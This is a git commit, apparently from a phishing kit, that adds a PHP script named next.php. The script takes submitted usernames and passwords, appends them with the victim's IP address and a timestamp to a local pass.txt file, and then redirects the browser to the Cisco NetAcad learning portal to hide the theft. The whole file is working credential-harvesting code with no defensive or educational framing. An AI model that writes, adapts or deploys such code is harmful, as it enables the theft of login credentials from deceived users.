f404b79753ea25123cb11c186fd98b8a274e558e
acadnetsecurity <80964602+acadnetsecurity@users.noreply.github.com>
2021-03-19 20:45:24 +0700

    Add files via upload

---
+++ next.php
@@ -0,0 +1,33 @@
+<?php
+$file = "pass.txt";
+$username = $_POST['username'];
+$password = $_POST['password'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a'); 
+fwrite($handle, "+++++++++++++++++++++++++
++++++++++++++++++++++++++++"); 
+fwrite($handle, "\n");
+fwrite($handle, "Email: ");
+fwrite($handle, "$username");
+fwrite($handle, "\n");
+fwrite($handle, "Password: ");
+fwrite($handle, "$password");
+fwrite($handle, "\n");
+fwrite($handle, "IP Address: ");
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "Date Submitted: ");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fwrite($handle, "++++++++++++++++++++++++++++++++++++++++++++++++++++");
+fwrite($handle, "\n");
+fwrite($handle, "\n");
+fclose($handle);
+echo "<script LANGUAGE=\"JavaScript\">
+<!--
+window.location=\"https://www.netacad.com/portal/learning\";
+// -->
+</script>";
+?>
